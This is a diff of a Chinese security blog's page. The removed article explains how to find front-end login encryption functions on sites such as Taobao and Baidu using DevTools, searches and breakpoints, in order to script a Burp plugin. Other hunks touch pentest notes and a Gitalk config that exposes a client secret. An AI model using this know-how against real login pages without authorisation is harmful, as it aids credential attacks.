-<ul>
-<li>目录<br>{:toc}</li>
-</ul>
-<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>相信用过我jsEncrypter这个插件的朋友，都会碰到一个问题。 <strong>那就是一些大型网站前端太复杂，以至于无法定位到前端数据加密函数所在的位置</strong>。无法定位到加密方法所在，自然就无法编写jsEncrypter的phantomJS脚本了。k哥在今晚给了我很多灵感，让我对这个问题有一个完美的解决方案。以至于现在已是12号的凌晨3点，我仍不舍得搁浅内心零散的想法。窗外稍许的车辆略过的轰鸣，在夜深人静时显得格外刺耳。不过还好，没破坏我静静码字感觉。下面让我慢慢将这简单弱智有点零散，但细细思考，却有点意思的想法，串成一个流程。</p>
-<h2 id="0x01-onClick定位法"><a href="#0x01-onClick定位法" class="headerlink" title="0x01 onClick定位法"></a>0x01 onClick定位法</h2><p>有时候在触发提交表单的标签中会存在一个onClik属性，该属性的值正好是一个js函数。而这个函数往往就是我们要找的数据加密函数。我们只需要找到它定义的地方即可。</p>
-<p><img src="\assets\img\ecnrypt\1.png" alt="图1-通过onClick属性定位"></p>
-<p>找到了加密数据的方法名之后，我们就可以去找一下该方法在那个js文件中定义，即可定位到位置。</p>
-<p><img src="\assets\img\ecnrypt\2.png" alt="图2-通过onClick定位到的方法"></p>
-<h2 id="0x02-Event-Listeners定位法"><a href="#0x02-Event-Listeners定位法" class="headerlink" title="0x02 Event Listeners定位法"></a>0x02 Event Listeners定位法</h2><p>这个方法非常好，也是我觉得最好的方法。F12打开开发者工具，然后使用选择箭头选择目标标签，最后打开开发者工具Event Listeners面板。就能显示该标签对应的额事件了。我们关注的当然是click事件了。</p>
-<p><img src="\assets\img\ecnrypt\3.png" alt="图3-通过Event Listeners定位"></p>
-<p>由此我们就知道，我们的数据加密方法在<code>uni_loginv4_tangram_dde753f.js</code>文件的32行。点击该链接就能直接调转到代码处。</p>
-<p><img src="\assets\img\ecnrypt\4.png" alt="图4-通过Event Listeners定位的代码"></p>
-<p>这个方法虽然非常好，但是有一个天坑需要注意！有时候标签是有绑定方法的，但看到Event Listeners面板却是空的。我猜是因为浏览器它没有加载完全所有的数据，导致无法分析出各个元素绑定的方法。这时我们可以进行将登录整个流程走一遍，多次刷新页面，甚至可以ctrl+s将网页保存到本地等操作，总之只为一个目的： <strong>间接告诉浏览器赶紧将一些网页资源保存下来，以供Event Listeners分析出click事件对应的方法</strong>。目前发现这样勉强能解决。</p>
-<p>这里插一句题外话：有一个和Event Listeners有关的辅助插件Visual Event，大家可以去体验一下。不过个人觉得不是特别好！</p>
-<h2 id="0x03-搜索定位法"><a href="#0x03-搜索定位法" class="headerlink" title="0x03 搜索定位法"></a>0x03 搜索定位法</h2><p>如果遇到的情况很糟糕，页面没有指定onClick方法，Event Listeners怎么操作都是空白一片，Visual Event也是半死不活的时候。这是我们就只能自己动手，丰衣足食了。当然我承认这种情况基本不可能发生。然而谁还没有个万一呢？</p>
-<p>先将页面ctrl+s,保存起来。然后使用notepad++搜索保存目录下所有内容。这时我们就要考虑寻找搜索关键字了。搜索操作过程虽然有点繁琐，但很简单。这里我挑比较有意思的选择搜索关键字的思考跟大家分享一下。</p>
-<ol>
-<li><p>从源头搜，什么是我们的源头搜呢？我们触发前端数据加密，然后进行传输的整个过程皆因为点击了一个标签造成。所以我们就可以通过这个标签的<code>id名</code>，<code>class名</code>或者<code>标签名</code>作为关键字去搜索，就能定位到开始进行加密处理的位置。最后根据起始位置，一步一步跟进就能找到我们的加密方法。</p>
-</li>
-<li><p>从终点搜，什么是我们的终点呢？当然是我们的最终发送数据包这一步了。我们可以用burp进行抓包，然后分析数据包的特点，提取关键字来定位。比如我们可以拿数据包提交的路径，可以拿数据包的参数等等作为关键字。定位到加密流程的最后一步，最后一步一步回溯找到加密方法。</p>
-</li>
-</ol>
-<p>例如：我打算从源头开始搜，查看到源码中淘宝的登录按钮标签id值为<code>J_SubmitStatic</code>,于是我以<code>#J_SubmitStatic</code>作为关键字开始定位。</p>
-<p><img src="\assets\img\ecnrypt\5.png" alt="图5-通过关键定位"></p>
-<h2 id="0x04-调试确认"><a href="#0x04-调试确认" class="headerlink" title="0x04 调试确认"></a>0x04 调试确认</h2><p>在使用了以上三个方法加辅助插件，基本可以保证能定位到99%网站前端密码的处理函数了。但我们仍然需要通过调式来确定我们定位到的地方就是数据加密方法。首选我们在定位的方法中打一个断点，然后在表单输入账号密码，最后点击提交。就可以进入调试模式了。进入调式模式，我们可以单步执行，梳理加密处理的每一步。方便我们更好的编写jsEncrypter插件的phantomJs脚本。</p>
-<p><img src="\assets\img\ecnrypt\6.png" alt="图6-调试确认"></p>
-<h2 id="0x05-最后的话"><a href="#0x05-最后的话" class="headerlink" title="0x05 最后的话"></a>0x05 最后的话</h2><p>我使用了以上流程，先后定位到了百度，淘宝，腾讯和京东的前端页面数据加密方法。证明了我们的流程大体还是很实用的。各位同学可以按照上面的方法去测试一下，看看自己能否快速定位到数据加密方法？当然你有更加快速的方法，欢迎留言，让我们的这个快速定位前端加密方法的流程更加完美！已是凌晨4点，明天还有工作。祝每个还在深夜码字写代码的灵魂晚安！</p>
-
-      
-
-    </div>
-
-
-
-
-
-    <footer class="article-footer">
-      
-        <a data-url="http://www.pa55w0rd.club/快速定位前端加密方法/" data-id="cjop6havw000soqt6mfa05wx0" class="article-share-link" data-share="baidu" data-title="快速定位前端加密方法（转发）">分享到</a>
-      
-
-      
-        <a href="http://www.pa55w0rd.club/快速定位前端加密方法/#gitalk-container" class="article-comment-link">评论</a>
+        <a href="http://pa55w0rd.github.io/phpstudy+https/#gitalk-container" class="article-comment-link">评论</a>
       
 
       
@@ -609,11 +582,11 @@ Content-Length: 196
 
     <footer class="article-footer">
       
-        <a data-url="http://www.pa55w0rd.club/解析漏洞/" data-id="cjop6haw3000xoqt6ub3gibl9" class="article-share-link" data-share="baidu" data-title="解析漏洞">分享到</a>
+        <a data-url="http://pa55w0rd.github.io/解析漏洞/" data-id="cjop6svwr000qq9t6k8mbjust" class="article-share-link" data-share="baidu" data-title="解析漏洞">分享到</a>
       
 
       
-        <a href="http://www.pa55w0rd.club/解析漏洞/#gitalk-container" class="article-comment-link">评论</a>
+        <a href="http://pa55w0rd.github.io/解析漏洞/#gitalk-container" class="article-comment-link">评论</a>
       
 
       
@@ -854,7 +827,7 @@ Content-Length: 196
 </li>
 <li><p>上传漏洞</p>
 <p>  各种web中间件解析漏洞，各类编辑器漏洞利用，bypass上传检测（黑名单、白名单配合解析漏洞、阶段、.htaccess自解析、配合本地包含漏洞一起利用</p>
-<p>  更多<a href="https://www.pa55w0rd.club/2018/10/19/fileupload/">《文件上传漏洞总结》</a></p>
+<p>  更多<a href="https://www.pa55w0rd.club/2018/10/19/fileupload/" target="_blank" rel="noopener">《文件上传漏洞总结》</a></p>
 </li>
 <li><p>xxe漏洞</p>
 <p>  xxe漏洞如果存在的话危害是非常大的，从读取信息到探测内网等等</p>
@@ -999,11 +972,11 @@ Content-Length: 196
 
     <footer class="article-footer">
       
-        <a data-url="http://www.pa55w0rd.club/渗透测试/" data-id="cjop6hb1s002soqt63pm0j73d" class="article-share-link" data-share="baidu" data-title="渗透测试流程">分享到</a>
+        <a data-url="http://pa55w0rd.github.io/渗透测试/" data-id="cjop6sw1p002oq9t6lkrf708y" class="article-share-link" data-share="baidu" data-title="渗透测试流程">分享到</a>
       
 
       
-        <a href="http://www.pa55w0rd.club/渗透测试/#gitalk-container" class="article-comment-link">评论</a>
+        <a href="http://pa55w0rd.github.io/渗透测试/#gitalk-container" class="article-comment-link">评论</a>
       
 
       
@@ -1319,7 +1292,7 @@ $(document).on("click", "ul.archive-list li.archive-list-item", function () {
     const gitalk = new Gitalk({
       clientID: "992fba235eb173826494",
       clientSecret: "d133f6427763be2cf4048e4d146a22043e745f22",
-      repo: "www.pa55w0rd.club",
+      repo: "pa55w0rd.github.io",
       owner: "Pa55w0rd",
       admin: "Pa55w0rd",
       // id: location.pathname,      // Ensure uniqueness and length less than 50
